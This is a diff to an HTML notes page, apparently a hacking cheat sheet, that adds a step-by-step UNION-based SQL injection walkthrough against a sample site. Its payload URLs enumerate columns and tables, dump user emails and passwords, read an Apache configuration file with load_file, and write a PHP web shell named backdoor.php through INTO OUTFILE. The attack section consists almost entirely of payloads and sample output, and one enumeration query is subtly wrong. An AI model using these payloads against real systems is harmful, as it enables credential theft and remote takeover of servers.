@@ -41,7 +41,81 @@
 
 		<div class="box">
 			<h3>SQL injection</h3>
-			<p>Lorem ipsum dolor sit, amet consectetur adipisicing elit. Molestias eaque enim necessitatibus a saepe? Iusto itaque at nostrum alias molestias qui quas minus odit aliquam. Alias rem aperiam ducimus optio.</p>
+			<p>Determining number of columns af actual table:</p>
+			<code class="etc">
+				http://store.com/login?name=' UNION ALL SELECT 1 %23'
+			</code>
+			<p>the browser shows an error, let's try adding the columns until we get a response</p>
+			<code class="etc">
+				http://store.com/login?name=' UNION ALL SELECT 1,2,3 %23'
+				http://store.com/login?name=' UNION ALL SELECT 1,2,3,4,5 %23'
+			</code>
+			<p>we got</p>
+			<code class="etc">
+				email: 4 <br>
+				password: 4 <br>
+			</code>
+			<p>we can now request the db name</p>
+			<code class="etc">
+				http://store.com/login?name=' UNION ALL SELECT 1,2,3,database(),5 %23'
+			</code>
+			<p>and get as response</p>
+			<code class="etc">
+				email: store_db <br>
+				password: 5
+			</code>
+			<p>now, request the table name: </p>
+			<code class="etc">
+				http://store.com/login?name=' UNION ALL SELECT 1,2,3,table_name,5 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema="store_db" %23'
+			</code>
+			<p>response</p>
+			<code class="etc">
+				email: users
+				password: 6
+			</code>
+			<p>requesting columns name:</p>
+			<code class="etc">
+				http://store.com/login?name=' UNION ALL SELECT 1,2,3,column_name,5 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema="store_db" AND table_name ="users" %23'
+			</code>
+			<p>response</p>
+			<code class="etc">
+				email: id <br>
+				password: 5 <br>
+				email: name <br>
+				password: 5 <br>
+				email: username <br>
+				password: 5 <br>
+				email: email <br>
+				password: 5 <br>
+				email: password <br>
+				password: 5 <br>
+			</code>
+			<p>requesting values from columns:</p>
+			<code class="etc">
+				http://store.com/login?name=' UNION ALL SELECT 1,2,3,email,password FROM store_db.users %23'
+			</code>
+			<p>response (OBS: a password field will likely be)</p>
+			<code class="etc">
+				email: admin@store.com <br>
+				password: @dm1n <br>
+				email: contact@store.com <br>
+				password: ST@ff <br>
+				email: ghost@store.com <br>
+				password: !23$$ <br>
+			</code>
+			<br> <br>
+			<p>find directories wich normal user can upload files:</p>
+			<code class="etc">
+				http://store.com/login?name=' UNION ALL SELECT 1,2,3,load_file("/etc/apache2/sites-available/000-default.conf"),5 %23'
+			</code>
+			<p>response</p>
+			<code class="etc">
+				DocumetRoot /var/www/html
+			</code>
+			<p>upload a file:</p>
+			<code class="etc">
+				http://store.com/login?name=' UNION ALL SELECT 1,2,3,4,"&ltpre>&lt?php system($_GET['cmd']) ?>" INTO OUTFILE "/var/www/html/pictures/backdoor.php" %23'
+			</code>
 		</div>
 
 		<h2>Nmap scripts</h2>
